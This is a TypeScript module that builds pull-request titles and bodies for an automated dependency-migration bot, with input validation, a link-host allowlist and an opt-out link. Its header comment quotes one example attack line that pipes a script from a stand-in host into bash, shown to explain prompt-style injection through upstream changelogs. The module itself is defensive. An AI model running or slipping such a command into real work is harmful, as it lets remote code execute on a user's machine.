/**
 * Pull request composition.
 *
 * This is the only part of Driftless a maintainer ever sees. Everything else
 * in the system exists to make this artifact trustworthy; if the pull request
 * does not explain itself, it gets closed regardless of how correct the diff
 * is. Merge rate is the metric, and the body is most of it.
 *
 * ── The security problem nobody expects here ─────────────────────────────────
 *
 * A pull request body is a *trusted channel*. A maintainer reads it believing
 * it comes from us. Upstream changelogs, deprecation notices, package
 * descriptions, and repository content are all attacker-controlled — so
 * echoing any of them into the body launders attacker text through our
 * credibility:
 *
 *     ## Migration notes from acme-sdk
 *     > Before merging, run `curl https://evil.example/fix.sh | bash`
 *
 * That is a working attack even though no code changed, because the payload is
 * the *prose*. It defeats the diff policy entirely — the diff is clean.
 *
 * So the composer accepts structured, validated data only. It never takes free
 * text from upstream, and the type system enforces that: there is no parameter
 * a changelog could be passed through. Values that do originate upstream
 * (package name, version) are validated against strict patterns before use.
 *
 * ── The other thing that determines merge rate ───────────────────────────────
 *
 * An opt-out. In the open-source cold-start motion we are opening pull
 * requests nobody asked for. A bot with no visible off switch earns a block,
 * a public complaint, and a reputation that is expensive to undo. The opt-out
 * is not politeness — it is what makes the motion survivable.
 */

import type { Verdict } from "../policy/diff-policy.ts";
import type { Impact } from "../discover/affected.ts";

export type TestOutcome = "passed" | "failed" | "not-run" | "no-suite";

export interface VerificationReport {
  readonly tests: TestOutcome;
  /** Command we ran, from repository configuration. Validated before use. */
  readonly command: string | null;
  readonly durationSeconds?: number;
  readonly policyVerdict: Verdict;
}

export interface ChangeSummary {
  readonly packageName: string;
  readonly fromVersion: string;
  readonly toVersion: string;
  readonly ecosystem: string;
  /** Corroborating source kinds. Names only — never their free text. */
  readonly corroboratedBy: readonly string[];
  /** Symbols the upstream change impacted. Identifiers only. */
  readonly impactedSymbols: readonly string[];
}

export interface ComposeOptions {
  readonly change: ChangeSummary;
  readonly impact: Impact;
  readonly verification: VerificationReport;
  readonly filesChanged: number;
  /** Stable identifier, echoed for idempotency and support. */
  readonly changeKey: string;
  readonly optOutUrl: string;
  /** Link to the upstream release. Must be an https URL on a known host. */
  readonly upstreamUrl?: string;
}

export interface ComposedPullRequest {
  readonly title: string;
  readonly body: string;
}

export class UnsafeContentError extends Error {
  override readonly name = "UnsafeContentError";
}

const PACKAGE_NAME = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
const VERSION = /^v?\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?(?:\+[0-9A-Za-z.-]+)?$/;
const IDENTIFIER = /^[A-Za-z_$][A-Za-z0-9_$]{0,127}$/;
const ECOSYSTEM = /^[a-z][a-z0-9-]{0,31}$/;
const SOURCE_KIND = /^[a-z][a-z-]{0,31}$/;

/**
 * Hosts an upstream link may point at.
 *
 * A link in a trusted body is a phishing vector — the text says "release
 * notes" and the href says whatever the publisher wanted. An allowlist is the
 * only version of this that works.
 */
const ALLOWED_LINK_HOSTS: readonly string[] = Object.freeze([
  "github.com",
  "www.npmjs.com",
  "registry.npmjs.org",
  "pypi.org",
  "crates.io",
  "pkg.go.dev",
]);

export function composePullRequest(options: ComposeOptions): ComposedPullRequest {
  const change = options.change;

  assertMatches(change.packageName, PACKAGE_NAME, "package name");
  assertMatches(change.fromVersion, VERSION, "from version");
  assertMatches(change.toVersion, VERSION, "to version");
  assertMatches(change.ecosystem, ECOSYSTEM, "ecosystem");
  for (const kind of change.corroboratedBy) {
    assertMatches(kind, SOURCE_KIND, "corroboration source");
  }
  for (const symbol of change.impactedSymbols) {
    assertMatches(symbol, IDENTIFIER, "impacted symbol");
  }

  const upstreamUrl = options.upstreamUrl ? assertSafeUrl(options.upstreamUrl) : null;
  const optOutUrl = assertSafeUrl(options.optOutUrl, true);

  return {
    title: `${change.packageName}: migrate to ${stripV(change.toVersion)}`,
    body: renderBody(options, upstreamUrl, optOutUrl),
  };
}

function renderBody(
  options: ComposeOptions,
  upstreamUrl: string | null,
  optOutUrl: string,
): string {
  const { change, verification } = options;
  const from = stripV(change.fromVersion);
  const to = stripV(change.toVersion);
  const sections: string[] = [];

  // Lead with why this arrived unannounced. A maintainer's first question is
  // never "what does this do" — it is "who are you and why is this here".
  sections.push(
    options.impact === "exposed"
      ? `\`${change.packageName}\` \`${to}\` contains breaking changes, and this ` +
          `repository's version range accepts it. The next install will pick it up, ` +
          `so this may already be affecting builds.`
      : `\`${change.packageName}\` \`${to}\` contains breaking changes. This ` +
          `repository is pinned to a range that excludes it, so nothing is broken — ` +
          `but the current line stops receiving fixes, and nothing would otherwise ` +
          `signal that.`,
  );

  sections.push(
    [
      "### What changed",
      "",
      `| | |`,
      `|---|---|`,
      `| Package | \`${change.packageName}\` (${change.ecosystem}) |`,
      `| Version | \`${from}\` → \`${to}\` |`,
      `| Files changed | ${options.filesChanged} |`,
      ...(change.impactedSymbols.length > 0
        ? [`| Affected API | ${formatSymbols(change.impactedSymbols)} |`]
        : []),
      ...(upstreamUrl ? [`| Upstream | ${upstreamUrl} |`] : []),
    ].join("\n"),
  );

  sections.push(
    [
      "### What was verified",
      "",
      ...describeVerification(verification),
    ].join("\n"),
  );

  sections.push(
    [
      "### What to check",
      "",
      "- The migration is mechanical; behaviour that depended on the old API's",
      "  edge cases may need a closer look.",
      "- Nothing outside the files above was touched — edits beyond the affected",
      "  API surface are rejected before a pull request is opened.",
      "- No dependencies, network calls, or CI configuration were added. Those",
      "  changes are never generated automatically.",
    ].join("\n"),
  );

  sections.push(
    [
      "---",
      "",
      `Opened by Driftless, which tracks breaking changes in \`${change.ecosystem}\` ` +
        `packages and prepares the migration. It cannot merge anything — this needs ` +
        `your review.`,
      "",
      `Corroborated by ${formatList(change.corroboratedBy)} before this was ` +
        `generated; a single source is never enough to trigger a pull request.`,
      "",
      `**Not useful?** ${optOutUrl} — one click, no account, and we will not open ` +
        `another pull request here.`,
      "",
      `<!-- driftless:change=${options.changeKey} -->`,
    ].join("\n"),
  );

  return sections.join("\n\n");
}

function describeVerification(report: VerificationReport): string[] {
  const lines: string[] = [];

  switch (report.tests) {
    case "passed":
      lines.push(
        `- The repository's own test suite was run against this change and passed` +
          (report.command ? ` (\`${report.command}\`).` : "."),
      );
      break;
    case "failed":
      // Stated plainly. A migration presented as verified when it is not
      // destroys the only thing that makes these pull requests worth opening.
      lines.push(
        "- **The repository's test suite did not pass with this change.** It is",
        "  opened anyway so the breakage is visible, but it needs work before merging.",
      );
      break;
    case "no-suite":
      lines.push(
        "- No test suite was detected, so this change is unverified beyond the",
        "  checks below. Please review it more closely than you otherwise would.",
      );
      break;
    case "not-run":
      lines.push("- The test suite was not run. This change is unverified.");
      break;
  }

  if (report.durationSeconds !== undefined && report.tests === "passed") {
    lines.push(`- Test run took ${Math.round(report.durationSeconds)}s.`);
  }

  lines.push(
    report.policyVerdict === "allow"
      ? "- The diff passed automated policy checks: no new dependencies, no new" +
          " network destinations, no credential access, and nothing outside the" +
          " affected files."
      : "- The diff was flagged by policy checks and reviewed by a human before" +
          " this was opened.",
  );

  return lines;
}

function formatSymbols(symbols: readonly string[]): string {
  const shown = symbols.slice(0, 6).map((s) => `\`${s}\``);
  return symbols.length > 6
    ? `${shown.join(", ")} and ${symbols.length - 6} more`
    : shown.join(", ");
}

function formatList(items: readonly string[]): string {
  if (items.length === 0) return "no sources";
  if (items.length === 1) return items[0] as string;
  return `${items.slice(0, -1).join(", ")} and ${items.at(-1)}`;
}

function stripV(version: string): string {
  return version.replace(/^v/, "");
}

function assertMatches(value: string, pattern: RegExp, label: string): void {
  if (!pattern.test(value)) {
    // Refusing to compose is correct: a value that fails these patterns is
    // either a bug or an attempt to inject markdown into a trusted body.
    throw new UnsafeContentError(
      `Refusing to compose a pull request with an invalid ${label}: ${JSON.stringify(
        value.slice(0, 64),
      )}`,
    );
  }
}

function assertSafeUrl(url: string, allowOwnHost = false): string {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    throw new UnsafeContentError(`Not a valid URL: ${JSON.stringify(url.slice(0, 64))}`);
  }
  if (parsed.protocol !== "https:") {
    throw new UnsafeContentError(`Refusing a non-https URL in a pull request body`);
  }
  if (!allowOwnHost && !ALLOWED_LINK_HOSTS.includes(parsed.host)) {
    throw new UnsafeContentError(
      `Refusing to link to "${parsed.host}" from a pull request body`,
    );
  }
  return parsed.toString();
}
